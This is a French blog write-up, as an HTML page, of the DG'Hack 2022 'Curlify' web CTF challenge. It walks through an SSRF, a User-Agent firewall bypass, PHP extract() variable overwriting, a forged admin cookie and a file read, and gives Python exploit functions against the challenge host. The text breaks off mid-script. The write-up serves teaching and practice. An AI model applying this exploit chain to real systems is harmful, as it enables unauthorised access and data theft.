<!DOCTYPE html>
<html><head>
  <meta charset="utf-8" />
  <title>
    
      Blog de TaylorDeDordogne
      | Curlify
    
  </title>
  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
  <meta name="description" content="" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <link
    rel="icon"
    href="/favicon_io/favicon.ico"
    type="image/x-icon"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-16x16.png"
    size="16x16"
    type="image/png"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-32x32.png"
    size="32x32"
    type="image/png"
  />

  
  <link
    rel="alternate"
    type="application/rss+xml"
    href="/index.xml"
    title="Blog de TaylorDeDordogne"
  />

  <link
    rel="preload"
    type="text/css"
    href="/css/rose-pine.min.css"
    integrity=""
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/rose-pine.min.css"
      integrity=""
    />
  </noscript><link rel="preconnect" href="https://fonts.googleapis.com" /><link
  rel="preconnect"
  href="https://fonts.gstatic.com"
  crossorigin
/><link
  href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;700&family=Roboto+Mono:wght@400;500;700&display=swap"
  rel="stylesheet"
/>
<link
    rel="preload"
    type="text/css"
    href="/css/toigian.min.b61aac0326c36b3a3319124f1f4ab30c8ce54f66f3ead7636cf33d56e7d0c6fa.css"
    integrity="sha256-thqsAybDazozGRJPH0qzDIzlT2bz6tdjbPM9VufQxvo="
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/toigian.min.b61aac0326c36b3a3319124f1f4ab30c8ce54f66f3ead7636cf33d56e7d0c6fa.css"
      integrity="sha256-thqsAybDazozGRJPH0qzDIzlT2bz6tdjbPM9VufQxvo="
    />
  </noscript>

  
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/light.min.29febe5c26ca625f7e2913e2509889a65637f415171eb003603102dea7cc42e0.css"
    integrity="sha256-Kf6+XCbKYl9+KRPiUJiJplY39BUXHrADYDEC3qfMQuA="
  />
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/dark.min.47fea451289f4f246c4875ba0aa5f6376183f220c766f5e90d15d6e48cb7b937.css"
    integrity="sha256-R/6kUSifTyRsSHW6CqX2N2GD8iDHZvXpDRXW5Iy3uTc="
  />

  <script>
    
    if (
      localStorage.theme === "dark" ||
      (!("theme" in localStorage) &&
        window.matchMedia("(prefers-color-scheme: dark)").matches)
    ) {
      document.documentElement.classList.add("dark");
    } else {
      document.documentElement.classList.remove("dark");
    }
  </script>

  
  
  <script
    defer
    src="/js/main.dfa968b06ebe7fb755eb156f7296445f20bd5ca0c82aa2eb755b1bfac4e2f294676471cf7670590073c364901a0dd5dc4b4c7b83f7a4a3c3b081f085c78fa1de.js"
    integrity="sha512-36losG6&#43;f7dV6xVvcpZEXyC9XKDIKqLrdVsb&#43;sTi8pRnZHHPdnBZAHPDZJAaDdXcS0x7g/eko8OwgfCFx4&#43;h3g=="
  ></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
  <script>
    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
  </script>
  
  
</head>
<body><header style="--layer: 10">
  <div
    aria-hidden="true"
    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
  ></div>

  <div
    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
  ><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/curlify/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Curlify</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="/index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


</div>
</header>
<main class="flex justify-center px-page-gutter py-page-top">
      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/curlify/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Curlify</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="/index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


<article>
  <h1>Curlify</h1>
  <time class="text-sm italic tabular-nums text-muted"
  >2023/01/09&nbsp;</time
>

  

  
    <div class="section">
      
        
        <a href="/tags/web/" id="tag">Web</a>
      
        
        <a href="/tags/dghack-2022/" id="tag">DG&#39;Hack 2022</a>
      
    </div>
  


  
    
      <details>
        <summary>Table of contents</summary>
        <div id="toc-list"><nav id="TableOfContents">
  <ol>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#premier-aperçu">Premier aperçu</a></li>
    <li><a href="#explication-du-code">Explication du code</a>
      <ol>
        <li><a href="#indexphp">index.php</a></li>
        <li><a href="#firewallphp">firewall.php</a></li>
        <li><a href="#prefsphp">prefs.php</a></li>
        <li><a href="#taskphp">task.php</a></li>
      </ol>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ol>
        <li><a href="#connection-en-tant-quadmin">Connection en tant qu&rsquo;admin</a></li>
        <li><a href="#création-dune-tâche">Création d&rsquo;une tâche</a></li>
        <li><a href="#obtention-du-ticket-contenant-le-flag">Obtention du ticket contenant le flag</a></li>
      </ol>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ol>
</nav></div>
      </details>
    
  
  <div class="content"><h1 id="dghack-2022-curlify">DGHACK 2022: Curlify</h1>
<p>Hello, pour ce premier Write up de l&rsquo;édition 2022 du DG&rsquo;Hack on commence par un challenge Web!</p>
<h2 id="introduction">Introduction</h2>
<p>Curlify était un challenge impliquant un mécanisme de SSRF plutôt intéressant, l&rsquo;objéctif étant de lire le contenu du fichier <code>flag.php</code>.</p>
<h2 id="premier-aperçu">Premier aperçu</h2>
<p>en arrivant sur la page web principale <code>index.php</code>, on arrive devant un input nous proposant de <code>&quot;curlifier&quot;</code> une url:</p>
<div>
    <img src="assets/Capture_0.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<p>Cet input nous permettra de faire faire des requêtes <code>GET</code> (et uniquement <code>GET</code>) par le serveur.
Pour cela on effectue une requête <code>POST</code> sur <code>index.php</code> avec un paramètre <code>url</code> qui contiendra l&rsquo;url que le serveur devra visiter.</p>
<p>mais avant d&rsquo;essayer cette fonctionalité on va jeter un oeil dans le code source pour y déceler de potentiels indices et bingo:</p>
<p><img src="./assets/Capture_1.PNG" alt=""></p>
<p>On y trouve une piste menant vers une page <code>dev.php</code>, en y accédant on se prend un gros stop dans les dents!</p>
<div>
    <img src="assets/Capture_2.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<p>On fait ici face à une restriction IP, mais attention, ici nul besoin d&rsquo; injecter des headers du type <code>X-Forwarded-For: 127.0.0.1</code>. Cette protection peut être facilement outrepassée en envoyant notre requête via le service mis à notre disposition, si on envoie:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1/dev.php
</span></span></code></pre></div><p>Dans le champ présent sur <code>index.php</code> on obtient bien la réponse à notre requête étant donné que la requête est effécutée par le serveur lui-même, on peut donc avoir accès aux endpoints nécessitant un accès interne!</p>
<div>
    <img src="assets/Capture_3.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<p>Yes, on a un accès à une backup du code source du site on va pouvoir investiguer tout ca!</p>
<h2 id="explication-du-code">Explication du code</h2>
<p>On comprends vite que le code que l&rsquo;on vient de récupérer provient correspond au code de l&rsquo;endpoint <code>admin_panel</code> du site accessible et nous n&rsquo;avons pas accès au code qui gère les requêtes que nouvs pouvons <code>curlifier</code>.
Le site comporte plusieurs scripts <code>php</code>, pas tous intéressant, voilà ce qu&rsquo;on peut tirer des scripts principaux:</p>
<h3 id="indexphp">index.php</h3>
<p>Script principal de l&rsquo;endpoint <code>admin_panel</code>, il permet à l&rsquo;utilisateur de s&rsquo;identifier dans l&rsquo;<code>admin_panel</code>. On peut distinguer trois choses intéressantes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$path</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="s2">&#34;/var/www/html/admin_panel/&#34;</span> <span class="o">.</span> <span class="nv">$source</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s2">&#34;/var/www/html/admin_panel/&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;/var/www/html/admin_panel/&#34;</span> <span class="o">.</span> <span class="nv">$source</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>Ce bout de code nous permet de lire n&rsquo;importe quel fichier présent dans le dossier <code>admin_panel</code>, malheureusement pas moyen de lire le flag et pas non plus moyen de magouiller sur les chemins relatifs étant donné que la fonction <code>realpath</code> est utilisée.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$WAF_ENABLED</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">include_once</span> <span class="s2">&#34;firewall.php&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>On remarque qu&rsquo;un pare-feu est utilisé, il nous faudra le bypasser.</p>
<div>
    <img src="assets/Capture_4.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<p>Et finalement on remarque ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span></code></pre></div><p>La fonction <code>extract</code> va importer sous formes de variables chaque élément de l&rsquo;array <code>_GET</code> dans le contexte de <code>index.php</code>.
Par exemple l&rsquo;élément <code>$_GET['DEFAULT_LANGUAGE']</code> va être placé dans la variable <code>$DEFAULT_LANGUAGE</code>.</p>
<p><img src="assets/secret_tool.png" alt=""></p>
<h3 id="firewallphp">firewall.php</h3>
<p>Ce script va gérer le pare-feu utilisé dans <code>index.php</code>, voilà son fonctionnement:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;%(^DGHACK/1\.0 \(Curlify\)$)%&#34;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;HTTP_USER_AGENT&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;div class=&#34;notification is-danger&#34;&gt;Blocked by WAF !&lt;/div&gt;&#39;</span><span class="p">);</span>
</span></span></code></pre></div><p>Le pare-feu se base sur l&rsquo;<code>User-Agent</code> du serveur et si il n&rsquo;est pas égal à <code>DGHACK/1.0 (Curlify)</code>, la requête est abandonnée.</p>
<p>Etant donné que notre requête <code>GET</code> peut être transmise par l&rsquo;intermédiaire du serveur lui-même, si on envoie une requête comme ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="c1"># Envoi d&#39;une requête sur admin_panel/index.php</span>
</span></span><span class="line"><span class="cl">    <span class="n">USER_AGENT</span> <span class="o">=</span> <span class="s2">&#34;DGHACK/1.0 (Curlify)&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/admin_panel/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://curlify3.chall.malicecyber.com/index.php&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rep</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span><span class="n">USER_AGENT</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span></code></pre></div><p>Notre header <code>User-Agent</code>, sera transmis à l&rsquo;endpoint <code>admin_panel</code> par l&rsquo;intermédiaire de la variable <code>_SERVER['HTTP_USER_AGENT']</code>. On est donc bien en mesure de bypass le pare-feu!</p>
<h3 id="prefsphp">prefs.php</h3>
<p>Lorsque l&rsquo;utilisateur se connecte sur l&rsquo;<code>admin_panel</code> il est possible de spécifier des préférences et notamment le langage à utiliser sur le site une fois connecté, et c&rsquo;est là la principale vulnérabilité qui va nous permettre de lire le contenu du fichier <code>flag.php</code>! Voici pourquoi:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Dans prefs.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">get_prefs</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$prefs</span><span class="p">,</span> <span class="nv">$lang</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nv">$prefs</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s2">&#34;fr-FR&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="no">__DIR__</span><span class="o">.</span><span class="s2">&#34;/user_prefs/fr-FR.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s2">&#34;en-EN&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="no">__DIR__</span><span class="o">.</span><span class="s2">&#34;/user_prefs/en-EN.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s2">&#34;us-US&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="no">__DIR__</span><span class="o">.</span><span class="s2">&#34;/user_prefs/us-US.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="no">__DIR__</span><span class="o">.</span><span class="s2">&#34;/user_prefs/</span><span class="si">$lang</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Dans index.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user_prefs&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">get_prefs</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">],</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;HTTP_ACCEPT_LANGUAGE&#34;</span><span class="p">],</span> <span class="nv">$DEFAULT_LANGUAGE</span><span class="p">);</span>
</span></span></code></pre></div><p>Si la variable <code>$_SERVER['HTTP_ACCEPT_LANGUAGE']</code> n&rsquo;est pas une valeur de langue valide et si la variable <code>$DEFAULT_LANGUAGE</code> est égale à <code>flag.php</code>, alors la langue préférée de l&rsquo;utilisateur sera:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/var/www/admin_panel/user_prefs/flag.php&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="taskphp">task.php</h3>
<p>Ce script, quant à lui permettait à l&rsquo;administrateur d&rsquo;assigner des tâches aux autres utilisateurs et c&rsquo;est lui qui va nous permettre de récupérer le flag! Voyez donc:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;userid&#34;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">.=</span> <span class="s2">&#34;UserId: &#34;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;userid&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user_prefs&#34;</span><span class="p">])</span> <span class="nv">$content</span> <span class="o">.=</span> <span class="s2">&#34;Preferences: &#34;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user_prefs&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>Chaqe tâche assignée par l&rsquo;administrateur crée un ticket qui contient les informations de l&rsquo;utilisateur qui effectue la requête avec notamment ses préférences qui normalement contiendra le flag comme expliqué précédemment.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Ca y&rsquo;est on va commencer à exploiter le site pour arriver à nos fins!</p>
<p><img src="assets/plan.jpg" alt=""></p>
<ul>
<li>On envoie le serveur faire une requête sur <code>admin_panel</code> pour nous connecter en tant qu&rsquo;admin et on met notre langage préféré à la valeur <code>flag.php</code>.</li>
<li>On assigne une tâche en tant qu&rsquo;admin, cette tâche contiendra la liste de nos préférences et donc de notre langage.</li>
<li>On récupère le flag grâce au ticket associé à notre tâche et qui sera généré sur un endpoint aléatoire auquel nous aurons accès.</li>
</ul>
<h3 id="connection-en-tant-quadmin">Connection en tant qu&rsquo;admin</h3>
<p>La principale difficulté pour se connecter en tant qu&rsquo;admin est que les différents paramètres pour effectuer cette connexion sont envoyés via une requête <code>POST</code>, or notre service qui nous donnne accès aux endpoints internes du site web ne nous permet que de:</p>
<ul>
<li>Faire des requêtes <code>GET</code>.</li>
<li>transmettre des headers pour ces dites requêtes.</li>
</ul>
<p>Mais comme spécifié précédemment une des vulnérabilité que présente ce site est l&rsquo;usage de la fonction <code>extract</code> sur le tableau <code>_GET</code>, si l&rsquo;on passe un tableau nommé <code>_POST</code> via une requête <code>GET</code>, il est possible de d&rsquo;assigner des valeurs au tableau <code>_POST</code> dans le script <code>admin_panel/index.php</code> comme si une requête <code>POST</code> légitime avait été faite dessus! <code>PHP</code> permet d&rsquo;interpréter un tableau passé dans l&rsquo;url comme ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://site.com?_POST<span class="o">[</span>username<span class="o">]=</span>username<span class="p">&amp;</span>_POST<span class="o">[</span>password<span class="o">]=</span>password
</span></span></code></pre></div><p>Mais ce n&rsquo;est pas la simple embûche pour se connecter en tant qu&rsquo;admin!
Il nous faut au choix:</p>
<ul>
<li>Des identifiants valides</li>
<li>Un cookie valide</li>
</ul>
<p>La deuxième options parait la plus simple, et en effet une erreur de code dans la fonction <code>generate_remember_me_cookie</code> nous est d&rsquo;une grande utilité:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generate_remember_me_cookie</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$user</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;$SECRET_KEY&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Ici, l&rsquo;usage des guillemets simples empêche l&rsquo;interpolation da la clé secrête ce qui fait que le <code>hash</code> sera toujours le même et un cookie valide pour l&rsquo;utilisateur admin sera:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin7a988e11680f9e151f6f46808690d5ca
</span></span></code></pre></div><p>Deux derniers détails, pour que le script <code>task.php</code> accepte d&rsquo;ajouter les préférences dans le ticket, il faut que la variable <code>$_SESSION['UserId']</code> soit set à 1.
Il n&rsquo;est pas possible de changer la variable <code>$_SERVER['HTTP_ACCEPT_LANGUAGE']</code> en utilisant les headers car j&rsquo;avais pensé dans un premier temps à utiliser le header <code>Accept-Language</code> pour influer sur cette variable.</p>
<p>C&rsquo;est deux problèmes se règlent donc de la même manière et avec la même technique que nouvs avons utilisé pour changer le tableau <code>_POST</code>: On passe deux tableaux appelés respectivement <code>_SESSSION</code> et <code>_SERVER</code> dans les paramètres de la requêtes <code>GET</code> et ils seront extraits par l&rsquo;appel à la fonction <code>extract($_GET)</code>. Finalement la fonction python pour se connecter en tant qu&rsquo;admin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">USER_AGENT</span> <span class="o">=</span> <span class="s2">&#34;DGHACK/1.0 (Curlify)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect_via_cookie_ask_flag</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/admin_panel/?_POST[username]=admin&amp;_COOKIE[remember_me]=admin7a988e11680f9e151f6f46808690d5ca&amp;DEFAULT_LANGUAGE=flag.php&amp;_SESSION[userid]=12&amp;_SERVER[HTTP_ACCEPT_LANGUAGE]=aaa&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://curlify3.chall.malicecyber.com/index.php&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rep</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span><span class="n">USER_AGENT</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rep</span><span class="o">.</span><span class="n">text</span>
</span></span></code></pre></div><p>Résultat:</p>
<div>
    <img src="assets/Capture_5.PNG", style="max-width:130%;margin-left: 50%;transform: translateX(-50%);">
</div>
<h3 id="création-dune-tâche">Création d&rsquo;une tâche</h3>
<p>Une fois qu&rsquo;on a établie une session en tant qu&rsquo;administrateur il devient trivial d&rsquo;assigner une tâche dont le ticket contiendra le flag, on peut le faire manuellement:</p>
<div>
    <img src="assets/Capture_6.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<p>Mais étant donné que les tickets créés se suppriment au bout de 15 seconds on préférera lier cette partie de l&rsquo;exploitation dans notre script python:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ask_for_a_task</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://curlify3.chall.malicecyber.com/admin_panel/task.php&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rep</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;author&#39;</span><span class="p">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;assignee&#39;</span><span class="p">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;type&#39;</span><span class="p">:</span><span class="s1">&#39;bug&#39;</span><span class="p">,</span> <span class="s1">&#39;description&#39;</span><span class="p">:</span><span class="s1">&#39;nice description&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rep</span><span class="o">.</span><span class="n">text</span>
</span></span></code></pre></div><p>Et hop plus qu&rsquo;à aller le récupérer ;)</p>
<div>
    <img src="assets/Capture_7.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<h3 id="obtention-du-ticket-contenant-le-flag">Obtention du ticket contenant le flag</h3>
<p>La dernière carabistouille proposée par ce challenge était le fait que les endpoints contenant les tickets renvoyaient un <code>403</code> pour les requêtes venant de l&rsquo;extérieur. Pour régler cela il nous faut juste utiliser une dernière fois le service <code>curlify</code> pour envoyer le serveur chercher let ticket pour nous:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search_for_task_file</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">filenum</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://curlify3.chall.malicecyber.com/index.php&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/admin_panel/tasks/task_</span><span class="si">%s</span><span class="s2">.txt&#34;</span> <span class="o">%</span> <span class="n">filenum</span>
